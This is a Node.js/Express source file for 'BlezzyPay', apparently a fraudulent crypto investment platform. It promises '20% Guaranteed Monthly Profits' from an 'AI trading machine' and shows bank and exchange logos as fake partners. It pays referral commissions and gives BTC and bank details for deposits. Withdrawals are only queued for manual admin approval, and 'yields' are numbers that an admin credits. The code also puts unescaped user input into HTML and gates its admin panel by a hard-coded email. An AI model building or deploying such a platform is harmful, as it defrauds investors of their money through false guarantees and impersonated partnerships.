const express = require('express');
const mongoose = require('mongoose');
const bcrypt = require('bcryptjs');
const session = require('express-session');
const app = express();

app.use(express.urlencoded({ extended: true }));
app.use(session({ 
    secret: process.env.SESSION_SECRET || 'blezzy_secure_77', 
    resave: false, 
    saveUninitialized: true 
}));

// --- 1. DATABASE SCHEMA ---
const UserSchema = new mongoose.Schema({
    email: { type: String, unique: true, required: true },
    password: { type: String, required: true },
    balance: { type: Number, default: 0 },
    lockedBonus: { type: Number, default: 0 },
    bonusReleaseDate: { type: Date },
    resetRequested: { type: Boolean, default: false }, // Password reset alert
    referredBy: { type: String, default: null },
    pendingDeposits: [{ amount: Number, status: { type: String, default: 'Pending' }, date: { type: Date, default: Date.now } }],
    pendingWithdrawals: [{ amount: Number, status: { type: String, default: 'Pending' }, date: { type: Date, default: Date.now } }],
    transactions: [{ type: { type: String }, amount: Number, date: { type: Date, default: Date.now } }]
});
const User = mongoose.model('User', UserSchema);

// --- 2. THE DASHBOARD ---
app.get('/dashboard', async (req, res) => {
    if (!req.session.userId) return res.redirect('/');
    const user = await User.findById(req.session.userId);
    const dateStr = user.bonusReleaseDate ? user.bonusReleaseDate.toLocaleDateString() : 'N/A';
    const referralLink = `${req.protocol}://${req.get('host')}/?ref=${user.email}`;
    const waMessage = encodeURIComponent("Welcome to BlezzyPay! Our AI trading machine guarantees 20% return. We trade Gold, Lithium, Cobalt, and Crypto. My email is: " + user.email);

    res.send(`
        <head>
            <title>BlezzyPay - Financial Dashboard</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
        </head>
        <style>
            body { font-family: sans-serif; background: #f4f7f6; margin: 0; color: #333; }
            .ticker-wrap { width: 100%; overflow: hidden; background: #2c3e50; color: #fff; padding: 12px 0; border-bottom: 3px solid #f39c12; }
            .ticker { display: flex; white-space: nowrap; animation: ticker 45s linear infinite; }
            .ticker-item { padding: 0 40px; font-size: 14px; font-weight: bold; }
            @keyframes ticker { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
            
            .card { background: white; padding: 25px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); max-width: 900px; margin: 20px auto; }
            .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin: 20px 0; }
            .box { padding: 20px; border-radius: 8px; text-align: center; color: white; }
            .balance-box { background: #2ecc71; }
            .bonus-box { background: #f39c12; }
            .amount { font-size: 28px; font-weight: bold; }
            
            .section { margin-bottom: 25px; padding: 15px; border: 1px solid #eee; border-radius: 8px; }
            .btn { padding: 12px; border: none; border-radius: 4px; color: white; cursor: pointer; font-weight: bold; width: 100%; margin-top: 5px; }
            
            .partner-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(130px, 1fr)); gap: 15px; margin-top: 25px; text-align:center; }
            .partner-item { background: white; padding: 10px; border-radius: 10px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); display: flex; align-items: center; justify-content: center; height: 70px; border: 1px solid #eee; }
            .partner-item img { max-height: 45px; max-width: 100%; display: block; }
            
            .whatsapp-btn { position: fixed; bottom: 30px; right: 30px; background: #25d366; color: white; padding: 15px 25px; border-radius: 50px; text-decoration: none; font-weight: bold; box-shadow: 0 4px 10px rgba(0,0,0,0.2); z-index: 1000; }
        </style>

        <div class="ticker-wrap">
            <div class="ticker">
                <div class="ticker-item">ROADMAP: <span style="color:#f1c40f;">New Gold-Backed Token (EAC & ECOWA) in 12 Months!</span></div>
                <div class="ticker-item">AI ASSETS: <span style="color:#f1c40f;">Gold, Lithium, Cobalt, BTC</span></div>
                <div class="ticker-item">YIELD: <span style="color:#2ecc71;">20% Guaranteed Monthly Profits</span></div>
            </div>
        </div>

        <div class="card">
            <div style="display:flex; justify-content:space-between; align-items:center;">
                <h2>Wallet Dashboard</h2>
                <a href="/logout" style="color:#e74c3c; text-decoration:none; font-weight:bold;">Logout</a>
            </div>

            <div class="stats-grid">
                <div class="box balance-box">
                    <p>Total Balance</p>
                    <div class="amount">$${user.balance.toFixed(2)}</div>
                </div>
                <div class="box bonus-box">
                    <p>AI Yield (20%)</p>
                    <div class="amount">$${user.lockedBonus.toFixed(2)}</div>
                    <small>Unlocks: ${dateStr}</small>
                </div>
            </div>

            <div class="section">
                <h3>Finance Operations</h3>
                <div style="display:grid; grid-template-columns: 1fr 1fr; gap:10px;">
                    <form action="/deposit" method="POST">
                        <input type="number" name="amount" placeholder="Deposit Amount" required style="width:100%; padding:10px; margin-bottom:5px; border:1px solid #ddd;">
                        <button type="submit" class="btn" style="background:#27ae60;">Deposit / Stake</button>
                    </form>
                    <form action="/withdraw" method="POST">
                        <input type="number" name="amount" placeholder="Withdraw Amount" required style="width:100%; padding:10px; margin-bottom:5px; border:1px solid #ddd;">
                        <button type="submit" class="btn" style="background:#e67e22;">Withdraw</button>
                    </form>
                </div>
            </div>

            <div class="section">
                <h3>Affiliate Link (5% Commission)</h3>
                <code style="background:#eee; padding:10px; display:block; border-radius:5px;">${referralLink}</code>
            </div>

            <div class="section">
                <h3>Account Security</h3>
                <form action="/change-password" method="POST">
                    <input type="password" name="newPassword" placeholder="New Passcode" required style="width:100%; padding:10px; margin-bottom:5px; border:1px solid #ddd;">
                    <button type="submit" class="btn" style="background:#34495e;">Update Passcode</button>
                </form>
            </div>

            <div class="partner-section" style="text-align:center;">
                <h3>Global Strategic Partners</h3>
                <div class="partner-grid">
                    <div class="partner-item"><img src="https://upload.wikimedia.org/wikipedia/commons/e/e8/Binance_Logo.svg"></div>
                    <div class="partner-item"><img src="https://upload.wikimedia.org/wikipedia/commons/a/aa/HSBC_logo_%282018%29.svg"></div>
                    <div class="partner-item"><img src="https://upload.wikimedia.org/wikipedia/commons/1/1a/Coinbase.svg"></div>
                    <div class="partner-item"><img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg"></div>
                </div>
            </div>
        </div>

        <a href="https://wa.me/46704406175?text=${waMessage}" target="_blank" class="whatsapp-btn">Live Support</a>
    `);
});

// --- 3. FINANCIAL & SECURITY LOGIC ---

app.post('/deposit', async (req, res) => {
    const amount = parseFloat(req.body.amount);
    const user = await User.findById(req.session.userId);
    user.pendingDeposits.push({ amount });
    await user.save();
    res.send(`
        <body style="font-family:sans-serif; text-align:center; padding:50px; background:#f4f7f6;">
            <div style="background:white; padding:30px; border-radius:12px; display:inline-block; border:1px solid #ddd; text-align:left; max-width:400px;">
                <h2 style="text-align:center;">Payment Details</h2>
                <p><strong>BTC:</strong> bc1qn4ajq8fppd3derk8a24w75jkk94pjynn063gm7</p>
                <p><strong>US Bank:</strong> Bank of America | 026009593</p>
                <p><strong>EU Bank:</strong> Barclay | GB33BARC20658259151311</p>
                <p><strong>Ref:</strong> ${user.email}</p>
                <hr>
                <div style="text-align:center;"><a href="/dashboard">Return to Dashboard</a></div>
            </div>
        </body>
    `);
});

app.post('/withdraw', async (req, res) => {
    const amount = parseFloat(req.body.amount);
    const user = await User.findById(req.session.userId);
    if (amount > user.balance) return res.send("Insufficient funds.");
    user.pendingWithdrawals.push({ amount });
    await user.save();
    res.send("<body style='text-align:center; padding:50px;'><h2>Request Sent</h2><p>Admin will verify and process your payout.</p><a href='/dashboard'>Back</a></body>");
});

app.post('/change-password', async (req, res) => {
    if (!req.session.userId) return res.redirect('/');
    const user = await User.findById(req.session.userId);
    user.password = await bcrypt.hash(req.body.newPassword, 10);
    await user.save();
    res.send("<script>alert('Passcode Updated'); window.location='/dashboard';</script>");
});

// --- 4. ADMIN & PASSWORD RECOVERY ---

app.get('/forgot-password', (req, res) => {
    res.send(`<body style="font-family:sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; background:#f0f2f5;">
        <form action="/request-reset" method="POST" style="background:white; padding:30px; border-radius:12px; width:300px;">
            <h3>Reset Request</h3>
            <input type="email" name="email" placeholder="Email" required style="width:100%; padding:10px; margin-bottom:10px;">
            <button type="submit" style="width:100%; padding:10px; background:#2c3e50; color:white; border:none;">Alert Admin</button>
            <br><br><a href="/">Back to Login</a>
        </form>
    </body>`);
});

app.post('/request-reset', async (req, res) => {
    const user = await User.findOne({ email: req.body.email });
    if (user) { user.resetRequested = true; await user.save(); }
    res.send("<body style='text-align:center; padding:50px;'><h2>Admin Alerted</h2><p>Please contact support via WhatsApp.</p><a href='/'>Home</a></body>");
});

app.get('/admin-secret-panel', async (req, res) => {
    const admin = await User.findById(req.session.userId);
    if (!admin || admin.email !== "emmanuel.iyere84@gmail.com") return res.send("Access Denied");
    const users = await User.find({});
    res.send(`
        <body style="font-family:sans-serif; background:#2c3e50; color:white; padding:40px;">
            <h1>Master Admin Control</h1>
            <table border="1" style="width:100%; background:white; color:black; border-collapse:collapse;">
                <tr style="background:#eee;"><th>User</th><th>Alerts</th><th>Pending Deposits</th></tr>
                ${users.map(u => `
                    <tr>
                        <td style="padding:10px;">${u.email}</td>
                        <td style="padding:10px;">${u.resetRequested ? '<b style="color:red;">RESET REQ</b>' : 'OK'}</td>
                        <td style="padding:10px;">
                            ${u.pendingDeposits.filter(d => d.status === 'Pending').map(d => `
                                <form action="/admin/approve-deposit" method="POST">
                                    $${d.amount} <input type="hidden" name="userId" value="${u._id}"><input type="hidden" name="depId" value="${d._id}">
                                    <button style="background:green; color:white;">Approve</button>
                                </form>
                            `).join('')}
                        </td>
                    </tr>
                `).join('')}
            </table>
            <br><a href="/dashboard" style="color:white;">Dashboard</a>
        </body>
    `);
});

app.post('/admin/approve-deposit', async (req, res) => {
    const { userId, depId } = req.body;
    const user = await User.findById(userId);
    const deposit = user.pendingDeposits.id(depId);
    if (deposit) {
        deposit.status = 'Approved'; user.balance += deposit.amount; user.lockedBonus += (deposit.amount * 0.20);
        const releaseDate = new Date(); releaseDate.setDate(releaseDate.getDate() + 30); user.bonusReleaseDate = releaseDate;
        user.transactions.push({ type: 'Deposit Approved', amount: deposit.amount });
        if (user.referredBy) {
            const ref = await User.findOne({ email: user.referredBy });
            if (ref) { ref.balance += (deposit.amount * 0.05); await ref.save(); }
        }
        await user.save();
    }
    res.redirect('/admin-secret-panel');
});

// --- 5. AUTH & STARTUP ---
app.get('/', (req, res) => {
    const ref = req.query.ref || '';
    res.send(`<body style="font-family:sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; background:#f0f2f5;">
        <form action="/login" method="POST" style="background:white; padding:30px; border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1); width:320px; text-align:center;">
            <h2>BlezzyPay Access</h2>
            <input type="email" name="email" placeholder="Email" required style="display:block; width:100%; padding:10px; margin-bottom:10px; box-sizing:border-box;">
            <input type="password" name="password" placeholder="Passcode" required style="display:block; width:100%; padding:10px; margin-bottom:10px; box-sizing:border-box;">
            <input type="hidden" name="referredBy" value="${ref}">
            <button type="submit" style="width:100%; padding:12px; background:#007bff; color:white; border:none; cursor:pointer; font-weight:bold;">Login / Register</button>
            <br><br><a href="/forgot-password" style="font-size:12px; color:#666; text-decoration:none;">Forgot passcode?</a>
        </form>
    </body>`);
});

app.post('/login', async (req, res) => {
    const { email, password, referredBy } = req.body;
    let user = await User.findOne({ email });
    if (!user) {
        const hashed = await bcrypt.hash(password, 10);
        user = await User.create({ email, password: hashed, referredBy: referredBy || null });
    }
    const match = await bcrypt.compare(password, user.password);
    if (match) { req.session.userId = user._id; res.redirect('/dashboard'); } else { res.send("Invalid credentials."); }
});

app.get('/logout', (req, res) => { req.session.destroy(); res.redirect('/'); });

const MONGO_URI = process.env.MONGO_URI;
mongoose.connect(MONGO_URI).then(() => {
    app.listen(process.env.PORT || 3000, () => console.log("Live"));
});
